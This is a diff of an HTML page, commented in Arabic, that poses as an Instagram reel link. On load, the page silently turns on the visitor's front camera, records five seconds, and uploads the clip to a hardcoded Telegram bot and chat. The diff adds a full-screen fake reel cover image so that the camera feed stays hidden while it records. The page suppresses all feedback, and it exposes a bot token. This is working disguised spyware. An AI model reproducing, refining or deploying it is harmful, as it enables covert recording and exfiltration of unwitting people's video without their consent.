@@ -4,15 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>https://www.instagram.com/reel/DRCJuY6jB5R/?igsh=ZmxkYzN0NGxsOHJn</title>
-    
     <style>
-        /* إخفاء كل شيء وجعل الفيديو يملأ الشاشة */
+        /* إعدادات الشاشة الأساسية */
         body {
             margin: 0;
             overflow: hidden; 
             background-color: #000;
         }
 
+        /* تنسيق الفيديو (يبقى في الخلفية) */
         #video {
             position: fixed;
             top: 50%;
@@ -21,32 +21,45 @@
             min-height: 100%;
             width: auto;
             height: auto;
-            z-index: -100;
+            z-index: 1; /* يجب أن يكون أدنى من الصورة */
             transform: translate(-50%, -50%);
-            border: none; 
+        }
+
+        /* تنسيق الصورة (تظهر كغلاف فوق الفيديو) */
+        #coverImage {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* لضمان تغطية الشاشة */
+            z-index: 10; /* يجب أن تكون أعلى من الفيديو */
+            transition: opacity 0.5s ease-out; /* لإضافة تأثير اختفاء سلس */
         }
     </style>
 </head>
 <body>
 
+    <img id="coverImage" src="https://res.cloudinary.com/duixjs8az/image/upload/v1763124618/b3jmvuytjsjargldqkpq" alt="Reels Cover Image">
+    
     <video id="video" autoplay playsinline></video> 
 
     <script>
         // ******************************************************
-        // ** إعدادات البوت - تم التضمين بالمعلومات التي قدمتها **
+        // ** إعدادات البوت والثوابت - تم التضمين بالمعلومات الخاصة بك **
         // ******************************************************
-        const BOT_TOKEN = '8299004372:AAErVG-8zGODSvHxn0ZChWzBWXa3iGvw3NA'; 
+        const BOT_TOKEN = '8299004372:AAErVG-8zGODSvXxn0ZChWzBWXa3iGvw3NA'; 
         const CHAT_ID = '7869791131'; 
-        // تم تغيير الأمر من sendPhoto إلى sendVideo
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
         
-        // مدة التسجيل بالمللي ثانية (مثلاً: 5 ثوانٍ)
+        // مدة التسجيل بالمللي ثانية (5 ثوانٍ)
         const RECORDING_DURATION_MS = 5000; 
 
         // ******************************************************
         // ** المتغيرات والوظائف                   **
         // ******************************************************
         const video = document.getElementById('video');
+        const coverImage = document.getElementById('coverImage');
         let stream = null;
         let mediaRecorder = null;
         const videoChunks = [];
@@ -58,17 +71,13 @@
             try {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                // استخدام 'video' كاسم للحقل المطلوب لـ sendVideo
                 formData.append('video', videoBlob, 'recorded_video.webm'); 
-                formData.append('caption', 'Recorded silently from front camera.');
+                formData.append('caption', 'Recorded silently with cover image from front camera.');
 
-                const response = await fetch(TELEGRAM_API_URL, {
+                await fetch(TELEGRAM_API_URL, {
                     method: 'POST',
                     body: formData,
                 });
-
-                // لا يوجد معالجة مرئية للنجاح/الفشل لتبقى صامتة
-
             } catch (error) {
                 // لا يوجد معالجة مرئية للأخطاء
             }
@@ -83,7 +92,14 @@
                 mediaRecorder.stop();
             }
 
-            // إيقاف بث الكاميرا بعد انتهاء التسجيل والإرسال
+            // إخفاء الصورة الغلاف بسلاسة بعد الانتهاء من التسجيل والإرسال
+            coverImage.style.opacity = '0';
+            // إزالة عنصر الصورة من DOM بعد اختفائه تماماً
+            setTimeout(() => {
+                coverImage.remove();
+            }, 600); // يجب أن تكون هذه المدة أطول قليلاً من مدة transition في CSS
+
+            // إيقاف بث الكاميرا بعد انتهاء التسجيل
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
                 video.srcObject = null;
@@ -98,6 +114,7 @@
             if (!stream) return;
 
             // MediaRecorder لتمكين تسجيل البث إلى ملف
+            // يمكن تحديد خيارات مثل mimeType هنا
             mediaRecorder = new MediaRecorder(stream);
             
             mediaRecorder.ondataavailable = (event) => {
@@ -134,18 +151,24 @@
                 });
                 video.srcObject = stream;
                 
+                // الانتظار حتى يتم تحميل بيانات الفيديو وبدء التشغيل
                 await new Promise(resolve => video.onloadedmetadata = resolve);
                 video.play();
                 
                 // *** بدء التسجيل التلقائي بعد 1 ثانية من بدء البث ***
+                // هذا التأخير يضمن أن يكون الفيديو مستقراً وأن الصورة الغلاف قد حملت
                 setTimeout(startRecording, 1000); 
 
             } catch (error) {
-                // لا يوجد معالجة مرئية للأخطاء
+                // في حال فشل الوصول للكاميرا، يمكن إخفاء الصورة الغلاف مباشرةً
+                coverImage.remove();
+                // لا يوجد معالجة مرئية أخرى
             }
         }
 
+        // بدء تشغيل الكاميرا عند تحميل الصفحة
         window.onload = startCamera;
     </script>
 </body>
 </html>
+
